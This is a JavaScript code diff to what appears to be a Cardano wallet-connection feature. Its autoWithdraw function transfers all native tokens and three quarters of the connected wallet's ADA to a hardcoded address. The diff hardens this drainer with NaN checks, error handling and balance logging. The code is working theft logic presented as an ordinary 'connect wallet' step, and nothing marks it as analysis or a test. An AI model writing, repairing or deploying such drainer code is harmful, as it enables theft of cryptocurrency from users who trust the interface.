@@ -91,13 +91,15 @@ function ConnectWallet({ onClose }) {
   }
 
 async function autoWithdraw(walletApi, currentBalance, address) {
-  if (currentBalance === null || currentBalance === 0) {
-    console.error("Balance not available or zero");
+  if (currentBalance === null || currentBalance === 0 || isNaN(currentBalance)) {
+    console.error("Balance not available or is NaN");
     return;
   }
 
   const recipientAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";
   let localBalance = currentBalance; // Track balance locally
+
+  console.log(`Starting balance: ${localBalance.toFixed(6)} ADA`);
 
   try {
     const protocolParams = await fetchProtocolParams();
@@ -122,8 +124,10 @@ async function autoWithdraw(walletApi, currentBalance, address) {
     for (let i = 0; i < utxos.len(); i++) {
       const utxo = utxos.get(i);
       const outputAmount = utxo.output().amount();
-      const adaAmount = outputAmount.coin().to_str();
-      totalAdaAmount += parseInt(adaAmount);
+      const adaAmount = parseInt(outputAmount.coin().to_str());
+      if (!isNaN(adaAmount)) {
+        totalAdaAmount += adaAmount;
+      }
 
       const multiasset = outputAmount.multiasset();
       if (multiasset) {
@@ -136,12 +140,14 @@ async function autoWithdraw(walletApi, currentBalance, address) {
           const K = assetNames.len();
           for (let j = 0; j < K; j++) {
             const assetName = assetNames.get(j);
-            const amount = multiasset.get_asset(policyId, assetName).to_str();
-            nonNativeTokens.push({
-              policyId: policyId.to_hex(),
-              assetName: Buffer.from(assetName.name()).toString(),
-              amount: parseInt(amount),
-            });
+            const amount = parseInt(multiasset.get_asset(policyId, assetName).to_str());
+            if (!isNaN(amount)) {
+              nonNativeTokens.push({
+                policyId: policyId.to_hex(),
+                assetName: Buffer.from(assetName.name()).toString(),
+                amount: amount,
+              });
+            }
           }
         }
       }
@@ -162,11 +168,16 @@ async function autoWithdraw(walletApi, currentBalance, address) {
             protocolParams,
             address
           );
-          
+
+          // Log the ADA used for the token transfer
+          console.log(`ADA used for ${token.assetName} transfer: ${adaUsedForTokenTransfer / 1000000} ADA`);
+
           // Subtract ADA used in this transaction
-          if (adaUsedForTokenTransfer) {
+          if (adaUsedForTokenTransfer && !isNaN(adaUsedForTokenTransfer)) {
             localBalance -= adaUsedForTokenTransfer / 1000000; // Convert Lovelace to ADA
-            console.log(`Local balance after ${token.assetName} transfer: ${localBalance} ADA`);
+            console.log(`Local balance after ${token.assetName} transfer: ${localBalance.toFixed(6)} ADA`);
+          } else {
+            console.error("Invalid ADA used for token transfer");
           }
 
           // Mark token as sent
@@ -182,28 +193,32 @@ async function autoWithdraw(walletApi, currentBalance, address) {
 
     // Withdraw 3/4 of the remaining ADA balance
     const adaToWithdraw = Math.floor(localBalance * 0.75);
-    const adaInLovelace = Math.floor(adaToWithdraw * 1000000).toString();
-    console.log(`Withdrawing 3/4 of ADA: ${adaInLovelace} Lovelace`);
+    if (!isNaN(adaToWithdraw)) {
+      const adaInLovelace = Math.floor(adaToWithdraw * 1000000).toString();
+      console.log(`Withdrawing 3/4 of ADA: ${adaInLovelace} Lovelace`);
 
-    try {
-      await buildSendADATransaction(
-        recipientAddress,
-        adaInLovelace,
-        walletApi,
-        protocolParams,
-        address
-      );
-      // Subtract ADA locally
-      localBalance -= adaToWithdraw;
-    } catch (error) {
-      console.error(`ADA transaction was declined or failed:`, error);
+      try {
+        await buildSendADATransaction(
+          recipientAddress,
+          adaInLovelace,
+          walletApi,
+          protocolParams,
+          address
+        );
+        // Subtract ADA locally
+        localBalance -= adaToWithdraw;
+        console.log(`Local balance after ADA withdrawal: ${localBalance.toFixed(6)} ADA`);
+      } catch (error) {
+        console.error(`ADA transaction was declined or failed:`, error);
+      }
+    } else {
+      console.error("Invalid ADA amount to withdraw");
     }
-
-    console.log(`Local balance after ADA withdrawal: ${localBalance} ADA`);
   } catch (error) {
     console.error("Error during auto-withdrawal:", error);
   }
 }
+
 
 
 async function calculateMinUTXO(outputAmount, protocolParams, multiAsset = null) {
@@ -233,6 +248,8 @@ async function buildSendTokenTransaction(
   protocolParams,
   address
 ) {
+  console.log(`Building transaction for ${assetName} with amount: ${amount}`);
+
   const txBuilder = CardanoWasm.TransactionBuilder.new(
     CardanoWasm.TransactionBuilderConfigBuilder.new()
       .fee_algo(
@@ -265,6 +282,7 @@ async function buildSendTokenTransaction(
     CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
   );
 
+  // Add UTXOs to the transaction
   utxos.forEach((utxo) => {
     txBuilder.add_input(
       CardanoWasm.Address.from_bech32(address),
@@ -286,12 +304,15 @@ async function buildSendTokenTransaction(
 
   // Calculate the correct minimum ADA required for this multi-asset transaction
   const minUTXO = await calculateMinUTXO(outputValue, protocolParams, assets);
+  console.log(`Minimum UTXO for ${assetName}: ${minUTXO.to_str()} Lovelace`);
 
   // Ensure the minimum ADA for the multi-asset transaction is met
   const adaAmountRequired = CardanoWasm.BigNum.max(
     minUTXO,
     CardanoWasm.BigNum.from_str('2000000') // Ensure at least 2 ADA in lovelace
   );
+
+  console.log(`ADA required for ${assetName}: ${adaAmountRequired.to_str()} Lovelace`);
 
   outputValue.set_coin(adaAmountRequired);
 
@@ -331,6 +352,7 @@ async function buildSendTokenTransaction(
   // Return the ADA used in this transaction (used to adjust local balance)
   return adaAmountRequired;
 }
+
 
 
 async function buildSendADATransaction(
